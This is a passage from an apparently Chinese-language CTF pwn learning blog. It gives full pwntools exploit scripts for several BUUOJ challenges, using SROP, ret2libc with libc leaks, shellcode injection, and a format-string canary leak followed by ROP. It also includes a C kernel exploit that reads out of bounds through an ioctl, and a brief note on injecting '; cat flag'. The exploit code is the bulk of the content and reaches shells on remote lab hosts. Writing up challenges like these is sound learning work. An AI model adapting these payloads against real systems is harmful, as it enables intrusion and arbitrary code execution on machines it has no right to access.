+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+rl = lambda a=False: p.recvline(a)
+ru = lambda x: p.recvuntil(bytes(x))
+rv = lambda x: p.recv(x)
+sl = lambda x: p.sendline(x)
+sd = lambda x: p.send(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+ia = lambda: p.interactive()
+dbg = lambda text = &#39;&#39;: gdb.attach(p, text)
+elf = ELF(&#39;./pwn&#39;)
+libc_start_main = elf.got[&#39;__libc_start_main&#39;]
+# dbg(&#39;b vuln&#39;)
+sys_call = 0x400501 
+syscall = 0x4004D6
+vuln = 0x4004ED
+# write /bin/sh into stack
+payload = b&#39;/bin/sh\x00&#39; + p64(ret) + (0x10 - len(&#39;/bin/sh\x00&#39;) - 0x8) * b&#39;a&#39; + p64(vuln)
+
+# get the address of &#39;/bin/sh&#39;
+sl(payload)
+
+rv(0x20)
+old_ebp = u64(rv(6).strip().ljust(8, b&#39;\x00&#39;))
+print(f&quot;old_ebp: &#123;hex(old_ebp)&#125;&quot;)
+buf =  0x7ffc783316d0
+ebp = 0x7ffc7833321b
+bin_sh = old_ebp + buf - ebp
+bin_sh = old_ebp - 0x118
+ret_addr = bin_sh + 0x8
+print(f&quot;bin_sh: &#123;hex(bin_sh)&#125;&quot;)
+
+signframe = SigreturnFrame(kernel=&#39;i386&#39;)
+signframe.rax = constants.SYS_execve
+signframe.rdi = bin_sh
+signframe.rsi = 0
+signframe.rdx = 0
+signframe.rip = sys_call
+
+payload = b&#39;/bin/sh\x00&#39; + p64(ret) + (0x10 - len(&#39;/bin/sh\x00&#39;) - 0x8) * b&#39;a&#39; + p64(0x4004DA) + p64(sys_call) + bytes(signframe)
+sl(payload)
+p.interactive()
+</code></pre>
+<h1 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h1><p>![[Pasted image 20250828114214.png]]</p>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import *
+
+context.update(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+# Local = True 
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:29864&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+rl = lambda a=False: p.recvline(a)
+ru = lambda x: p.recvuntil(bytes(x))
+rv = lambda x: p.recv(x)
+sl = lambda x: p.sendline(x)
+sd = lambda x: p.send(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+ia = lambda: p.interactive()
+dbg = lambda text = &#39;&#39;: gdb.attach(p, text)
+elf = ELF(&#39;./pwn&#39;)
+
+# dbg(&#39;&#39;&#39;
+# b *chall+212
+# &#39;&#39;&#39;)
+
+printf_plt = elf.plt[&#39;printf&#39;]
+printf_got = elf.got[&#39;printf&#39;]
+awelcoms = 0x08048845
+chall = 0x08048603
+main = 0x080486E2
+
+rl()
+rl()
+rl()
+rl()
+rl()
+rl()
+rl()
+rl()
+s_addr = rl().strip()[-10:]
+print(f&quot;s_addr: &#123;s_addr&#125;&quot;)
+s_addr = int(s_addr, 16)
+print(f&quot;s_addr: &#123;hex(s_addr)&#125;&quot;)
+
+#-----leak address of libc-----#
+payload = b&#39;crashme\x00&#39; + (0x1a - len(b&#39;crashme\x00&#39;)) * b&#39;a&#39; + p32(printf_plt) + p32(main) + p32(awelcoms) + p32(printf_got)
+sl(payload)
+rl()
+rl()
+rl()
+ru(b&#39;Welcome &#39;)
+printf = u32(rv(4))
+print(f&quot;printf: &#123;hex(printf)&#125;&quot;)
+obj = LibcSearcher(&#39;printf&#39;, printf)
+libc = printf - obj.dump(&#39;printf&#39;)
+system = libc + obj.dump(&#39;system&#39;)
+bin_sh = libc + obj.dump(&#39;str_bin_sh&#39;)
+
+ru(b&#39;&gt; &#39;)
+payload = b&#39;crashme\x00&#39; + (0x1a - len(b&#39;crashme\x00&#39;)) * b&#39;a&#39; + p32(system) + p32(chall) + p32(bin_sh)
+sl(payload)
+
+p.interactive()
+</code></pre>
+<p>由于没开启栈可执行保护，所以是可以向栈内写入<code>shellcode</code>来直接打的。但我感觉泄露libc制造ROP也行，然后确实也打通了（（（<br>本题目的本意肯定是写<code>shellcode</code>的，因为第一句就把s的地址给出来了（）不过我没管，感觉还要计算偏移好麻烦。但是还是试一下吧，毕竟自己对写<code>shellcode</code>的题目也不是很熟，就当练习了。</p>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import *
+
+context.update(arch=&#39;i386&#39;, os=&#39;linux&#39;)
+# Local = True 
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:29860&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+rl = lambda a=False: p.recvline(a)
+ru = lambda x: p.recvuntil(bytes(x))
+rv = lambda x: p.recv(x)
+sl = lambda x: p.sendline(x)
+sd = lambda x: p.send(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+ia = lambda: p.interactive()
+dbg = lambda text = &#39;&#39;: gdb.attach(p, text)
+elf = ELF(&#39;./pwn&#39;)
+
+# dbg(&#39;&#39;&#39;
+# b *0x08048600
+# &#39;&#39;&#39;)
+
+printf_plt = elf.plt[&#39;printf&#39;]
+printf_got = elf.got[&#39;printf&#39;]
+awelcoms = 0x08048845
+chall = 0x08048603
+main = 0x080486E2
+shellcode=asm(shellcraft.sh())
+
+rl()
+rl()
+rl()
+rl()
+rl()
+rl()
+rl()
+rl()
+s_addr = rl().strip()[-10:]
+print(f&quot;s_addr: &#123;s_addr&#125;&quot;)
+s_addr = int(s_addr, 16)
+print(f&quot;s_addr: &#123;hex(s_addr)&#125;&quot;)
+shellcode_addr = s_addr - 0x1c
+
+print(f&quot;shellcode_addr: &#123;hex(shellcode_addr)&#125;&quot;)
+print(len(b&#39;crashme\x00&#39;))
+#-----leak address of libc-----#
+payload = b&#39;crashme\x00&#39; + b&#39;a&#39; * (0x16 - len(b&#39;crashme\x00&#39;) + 0x4) + p32(shellcode_addr) + shellcode
+# payload = b&#39;crashme\x00&#39; + (0x1a - len(b&#39;crashme\x00&#39;)) * b&#39;a&#39; + p64(shellcode_addr) + shellcode
+sl(payload)
+p.interactive()
+</code></pre>
+<h1 id="mrctf2020-shellcode"><a href="#mrctf2020-shellcode" class="headerlink" title="mrctf2020_shellcode"></a>mrctf2020_shellcode</h1><p>![[Pasted image 20250828150010.png]]<br>第一次见到开启了<code>PIE</code>保护的题目，但是这个题没办法反编译，直接看汇编，就是读一段字符，传到<code>buf</code>里面，然后直接<code>call [rbp + buf]</code>，鉴定为脑残题，写一段<code>shellcode</code>进去就行了，我还以为要爆一下<code>libc</code>，激动坏了第一次在<code>buu</code>上看到类似的题目。</p>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import *
+
+context.update(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+# Local = True 
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:26158&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+rl = lambda a=False: p.recvline(a)
+ru = lambda x: p.recvuntil(bytes(x))
+rv = lambda x: p.recv(x)
+sl = lambda x: p.sendline(x)
+sd = lambda x: p.send(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+ia = lambda: p.interactive()
+dbg = lambda text = &#39;&#39;: gdb.attach(p, text)
+elf = ELF(&#39;./pwn&#39;)
+
+rl()
+payload = asm(shellcraft.sh())
+sl(payload)
+
+p.interactive()
+</code></pre>
+<h1 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h1><p>ROP，只开了NX保护。由于要调用<code>write</code>，但是没有找到<code>pop rdx</code>的gadget，只能<code>ret2csu</code>来设置参数了。</p>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import *
+
+context.update(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+# Local = True 
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:25180&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+rl = lambda a=False: p.recvline(a)
+ru = lambda x: p.recvuntil(bytes(x))
+rv = lambda x: p.recv(x)
+sl = lambda x: p.sendline(x)
+sd = lambda x: p.send(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+ia = lambda: p.interactive()
+dbg = lambda text = &#39;&#39;: gdb.attach(p, text)
+elf = ELF(&#39;./pwn&#39;)
+
+# dbg(&#39;&#39;&#39;
+#  b *vulnerable_function+5
+# &#39;&#39;&#39;)
+
+write_plt = elf.plt[&#39;write&#39;]
+write_got = elf.got[&#39;write&#39;]
+pop_6_ret = 0x04006AA
+pop_rdi = 0x4006b3
+arg_set = 0x400690
+main = 0x40061A
+ru(b&#39;Input:\n&#39;)
+payload = 0x88 * b&#39;a&#39; + p64(pop_6_ret)
+payload += p64(0)
+payload += p64(1)
+payload += p64(write_got)
+payload += p64(8)
+payload += p64(write_got)
+payload += p64(1)
+payload += p64(arg_set)
+payload += p64(0) * 7
+payload += p64(main)
+sl(payload)
+
+write = u64(rv(6).ljust(8, b&#39;\x00&#39;))
+obj = LibcSearcher(&#39;write&#39;, write)
+print(f&quot;write_addr: &#123;hex(write)&#125;&quot;)
+libc = write - obj.dump(&#39;write&#39;)
+system = libc + obj.dump(&#39;system&#39;)
+bin_sh = libc + obj.dump(&#39;str_bin_sh&#39;)
+ru(b&#39;Input:\n&#39;)
+payload = 0x88 * b&#39;a&#39; + p64(pop_rdi) + p64(bin_sh) + p64(system)
+sl(payload)
+p.interactive()
+</code></pre>
+<h1 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h1><p>保护情况如下所示：</p>
+<pre><code class="language-bash">[*] &#39;/home/spongebob/Document/pwn/pwn&#39;
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+</code></pre>
+<p>并没有明显的后门函数，存在一个栈溢出。目前思路：先泄露canary，然后通过<code>puts</code>泄露<code>libc</code>基址，然后调<code>system(&#39;/bin/sh&#39;)</code>。<br>gift函数只接收6个字符，无法泄露canary，vuln中的read后没有puts，也无法泄露canary()，卡住了</p>
+<p>不对，gift函数中scanf读入了format之后，有直接打印format，这里有格式化字符串漏洞（格式化字符串是我的薄弱项ovo）。</p>
+<p>泄露了canary之后直接ret2libc就行</p>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import *
+
+context.update(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+# Local = True 
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:29582&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+rl = lambda a=False: p.recvline(a)
+ru = lambda x: p.recvuntil(bytes(x))
+rv = lambda x: p.recv(x)
+sl = lambda x: p.sendline(x)
+sd = lambda x: p.send(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+ia = lambda: p.interactive()
+dbg = lambda text = &#39;&#39;: gdb.attach(p, text)
+elf = ELF(&#39;./pwn&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+
+puts_got = elf.got[&#39;puts&#39;]
+puts_plt = elf.plt[&#39;puts&#39;]
+pop_rdi = 0x400993
+vuln = 0x4008B1
+main = 0x4008DA
+
+# dbg(&#39;&#39;&#39;
+#     b *vuln+55
+# &#39;&#39;&#39;)
+
+ru(b&#39;u!\n&#39;)
+sl(b&#39;%7$p&#39;)
+ru(b&#39;0x&#39;)
+canary = int(rv(16),16)
+print(f&quot;canary: &#123;canary&#125;&quot;)
+ru(b&#39;story!\n&#39;)
+payload = b&#39;a&#39; * (0x20 - 0x8) + p64(canary) + p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)
+sl(payload)
+put = u64(rv(6).ljust(8, b&#39;\x00&#39;))
+print(f&quot;put_addr: &#123;hex(put)&#125;&quot;)
+
+obj = LibcSearcher(&#39;puts&#39;, put)
+libc = put - obj.dump(&#39;puts&#39;)
+system = libc + obj.dump(&#39;system&#39;)
+bin_sh = libc + obj.dump(&#39;str_bin_sh&#39;)
+
+print(f&quot;libc: &#123;hex(libc)&#125;&quot;)
+print(f&quot;system: &#123;hex(system)&#125;&quot;)
+print(f&quot;bin_sh: &#123;hex(bin_sh)&#125;&quot;)
+
+# libc_base = put - libc.sym[&#39;puts&#39;]
+# system = libc_base + libc.sym[&#39;system&#39;]
+# bin_sh = libc_base + next(libc.search(b&#39;/bin/sh\x00&#39;))
+
+rl()
+payload = b&#39;a&#39; * (0x20 - 0x8) + p64(canary) + p64(0) + p64(pop_rdi) + p64(bin_sh) + p64(system) + p64(vuln)
+sl(payload)
+
+p.interactive()
+</code></pre>
+<p>远程没打通，并且找不到原因。先不管了，之后再看。<br>找到问题了，正确的wp如下：</p>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import *
+
+context.update(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+# Local = True 
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:27694&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+rl = lambda a=False: p.recvline(a)
+ru = lambda x: p.recvuntil(bytes(x))
+rv = lambda x: p.recv(x)
+sl = lambda x: p.sendline(x)
+sd = lambda x: p.send(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+ia = lambda: p.interactive()
+dbg = lambda text = &#39;&#39;: gdb.attach(p, text)
+elf = ELF(&#39;./pwn&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+
+puts_got = elf.got[&#39;puts&#39;]
+puts_plt = elf.plt[&#39;puts&#39;]
+pop_rdi = 0x400993
+vuln = 0x400887
+main = 0x4008DA
+ret = 0x4008D9
+
+# dbg(&#39;&#39;&#39;
+#     b *vuln+55
+# &#39;&#39;&#39;)
+
+ru(b&#39;u!\n&#39;)
+sl(b&#39;%7$p&#39;)
+ru(b&#39;0x&#39;)
+canary = int(rv(16),16)
+print(f&quot;canary: &#123;canary&#125;&quot;)
+ru(b&#39;story!\n&#39;)
+payload = b&#39;a&#39; * (0x20 - 0x8) + p64(canary) + p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)
+sl(payload)
+put = u64(rv(6).ljust(8, b&#39;\x00&#39;))
+print(f&quot;put_addr: &#123;hex(put)&#125;&quot;)
+
+obj = LibcSearcher(&#39;puts&#39;, put)
+libc_base = put - obj.dump(&#39;puts&#39;)
+system = libc_base + obj.dump(&#39;system&#39;)
+bin_sh = libc_base + obj.dump(&#39;str_bin_sh&#39;)
+
+
+# libc_base = put - libc.sym[&#39;puts&#39;]
+# system = libc_base + libc.sym[&#39;system&#39;]
+# bin_sh = libc_base + next(libc.search(b&#39;/bin/sh\x00&#39;))
+
+print(f&quot;libc: &#123;hex(libc_base)&#125;&quot;)
+print(f&quot;system: &#123;hex(system)&#125;&quot;)
+print(f&quot;bin_sh: &#123;hex(bin_sh)&#125;&quot;)
+
+rl()
+payload = b&#39;a&#39; * (0x20 - 0x8) + p64(canary) + p64(0) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system) + p64(vuln)
+sl(payload)
+
+p.interactive()
+</code></pre>
+<p>有两个错误（bushi</p>
+<ol>
+<li>返回地址vuln搞错了，应该是复制的时候没注意</li>
+<li>调用函数需要栈16字节对齐。因此需要一个<code>ret</code>使得栈对齐</li>
+</ol>
+<h1 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h1><p>感觉是个 ** 题目，直接输入1，然后; cat flag就行</p>
+<h1 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h1><p>堆题（！！！！终于做到有关堆的题目了，可以开始新的学习了<br>第一步是先简单的逆向<br>结果下图所示：</p>
+<p>今天没有多做堆&#x2F;栈的题目，打TFC CTF做到了一道kernel pwn题。</p>
+<p>记录一些知识点，之后要了解其细节：</p>
+<ol>
+<li>CPU从用户态切换到内核态经历的具体过程</li>
+<li>Linux下的系统调用以<code>eax/rax</code>寄存器作为<strong>系统调用号</strong>，参数传递约束如下：</li>
+</ol>
+<ul>
+<li><p>32 位：<code>ebx、ecx、edx、esi、edi、ebp</code> 作为第一个参数、第二个参数…进行参数传递</p>
+</li>
+<li><p>64 位：<code>rdi、rsi、rdx、r10、r8、r9</code> 作为第一个参数、第二个参数…进行参数传递</p>
+<p>  对于 32 位系统调用而言，Linux 实际上通过 0x80 号软中断实现系统调用的基本功能，即用户态程序通过 <code>int 0x80</code> 指令触发一个软中断陷入内核题，对应的中断处理程序会根据系统调用号在系统调用表中调用对应的处理</p>
+</li>
+</ul>
+<p>接着上次的<code>kernel pwn</code>题</p>
+<h1 id="TFC-CTF"><a href="#TFC-CTF" class="headerlink" title="TFC CTF"></a>TFC CTF</h1><h3 id="slots"><a href="#slots" class="headerlink" title="slots"></a>slots</h3><p>查看一下<code>/dev</code>目录下多的设备文件，名字为：<code>slot_machine</code>，IDA看一下具体交互的函数</p>
+<ul>
+<li><code>cmd = 0</code>，kmalloc(chunk)，但是最多两次</li>
+<li><code>cmd = 1</code>，free(chunk)，</li>
+<li><code>cmd = 3</code>，copy_from_user</li>
+<li><code>cmd = 1337</code>，copy_to_user</li>
+</ul>
+<p>这里有一些在内核中与用户态函数发挥作用相同的函数：</p>
+<p>memcpy() -&gt; <strong>copy_from_user()&#x2F;copy_to_user()</strong><br>    - copy_from_user() 实现了将用户空间的数据传送到内核空间<br>    - copy_to_user()<br>malloc() -&gt; <strong>kmalloc()</strong>，内核态的内存分配函数，和 malloc() 相似，但使用的是 <code>slab/slub 分配器</code><br>free() -&gt; <strong>kfree()</strong>，同 kmalloc()</p>
+<p>![[Pasted image 20250902203717.png]]<br>这里<code>kfree</code>掉之后并没有将指针置空，所以存在典型的UAF<br>![[Pasted image 20250902204516.png]]<br>这里有一个问题，offset可以是负的，可以从内核中读任意大小的size到用户态并且写出来。这就可以直接从chunk地址中读flag了。</p>
+<p>exp如下：</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/ioctl.h&gt;
+
+/**
+ * Kernel Pwn Infrastructures
+**/
+
+#define SUCCESS_MSG(msg)    &quot;\033[32m\033[1m[+]&quot; msg &quot;\033[0m&quot;
+#define INFO_MSG(msg)       &quot;\033[34m\033[1m[*]&quot; msg &quot;\033[0m&quot;
+#define ERROR_MSG(msg)      &quot;\033[31m\033[1m[x]&quot; msg &quot;\033[0m&quot;
+
+#define log_success(msg)    puts(SUCCESS_MSG(msg))
+#define log_info(msg)       puts(INFO_MSG(msg))
+#define log_error(msg)      puts(ERROR_MSG(msg))
+
+#define MAX_OFFSET 0x100000
+
+/*
+Searching for byte: b&#39;CTF&#123;fakeflag&#125;&#39;
+[pt_ff110000022fc] 0xff11000002335560 &#39;CTF&#123;fakeflag&#125;\n&#39;
+[pt_ffffffffc0201] 0xffffffffc0201560 &#39;CTF&#123;fakeflag&#125;\n&#39;
+*/
+
+struct data
+&#123;
+    size_t index;
+    size_t size;
+    char * buf;
+&#125;data;
+
+int main() &#123;
+    // initialize 
+    int fd = open(&quot;/dev/slot_machine&quot;, O_RDWR);
+
+    // ioctl to alloc chunk
+    log_info(&quot;alloc chunk of size 0x400&quot;);
+    size_t chunk_size = 0x400;
+    ioctl(fd, 0, &amp;chunk_size);
+
+    // ioctl to read chunk[-0x436a0]
+    log_info(&quot;read chunk[-0x100000]&quot;);
+    struct data user_data;
+    user_data.buf = malloc(MAX_OFFSET);
+    user_data.index = 0 - (MAX_OFFSET);
+    user_data.size = MAX_OFFSET;
+    ioctl(fd, 1337, &amp;user_data);
+    printf(&quot;[*] read chunk :&quot;);
+    write(1, user_data.buf, user_data.size);
+    log_info(&quot;free chunk&quot;);
+    ioctl(fd, 1, 0);
+&#125;
+</code></pre>
+<p>交互脚本如下：</p>
+<pre><code class="language-python">from pwn import *
+import base64
+
+# context.log_level = &quot;debug&quot;
+
+with open(&quot;./exp2&quot;, &quot;rb&quot;) as f:
+    exp = base64.b64encode(f.read())
+    
+# p = process(&quot;ncat --ssl slots-d7c8dd09933f35f4.challs.tfcctf.com 1337&quot;.split())
+p = process(&quot;./run.sh&quot;)
+p.recvuntil(b&quot;~ $ &quot;)
+print(&quot;ncat success&quot;)
+
+count = 0
+for i in range(0, len(exp), 0x200):
+    chunk = exp[i:i + 0x200]
+    p.sendline(b&quot;echo -n \&quot;&quot; + chunk + b&quot;\&quot; &gt;&gt; b64_exp&quot;)
+    count += 1
+
+for i in range(count):
+    p.recvuntil(b&quot;~ $&quot;)
+
+p.sendline(b&quot;base64 -d b64_exp &gt; exp&quot;)
+p.sendline(b&quot;chmod +x exp&quot;)
+p.sendline(b&quot;./exp | grep CTF&quot;)
+
+p.interactive()
+</code></pre>
+<p>然后接着看堆的内容罢（）</p>
+<h1 id="babyheap-0ctf-2017-1"><a href="#babyheap-0ctf-2017-1" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h1><p>64位，保护全开</p>
+<pre><code class="language-bash">[*] &#39;/home/spongebob/Document/pwn/babyheap_0ctf_2017&#39;
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+</code></pre>
+<p>分配结构体结构为：</p>
+<pre><code class="language-c">struct&#123;
+	int flag;
+	int size;
+	long int addr;
+&#125;
+</code></pre>
+<p>在<code>fill</code>函数中有一个堆溢出，可以写任意<code>size</code>的内容到<code>addr</code>处，因此</p>
+<p>![[Pasted image 20250903153014.png]]</p>
+<p>洞基本找到了，但是发现不会利用～<br>还是对堆的基本操作和原理不是很清晰。最近就拿这个题来熟悉一下堆实现的具体操作和原理吧</p>
+<h1 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h1><p>堆题，保护开启情况：</p>
+<pre><code class="language-bash">[*] &#39;/home/spongebob/Document/pwn/pwn&#39;
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+</code></pre>
+<p>![[Pasted image 20250903150722.png]]<br>这里自定义的<code>my_read</code>函数回读size+1个字符才<code>break</code>掉，因为</p>
+<pre><code class="language-c">if(i==size)
+	break;
+</code></pre>
+<p>放在最后面，所以存在一个<code>off_by_one</code>。后面的内容没看懂。这题先放一放</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2025 - 2025 SpongeBobの pineapple house
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;SpongeBob
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
+    <script src="/js/fireworks.min.js"></script>
+    <script src="/js/cursor.min.js"></script>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
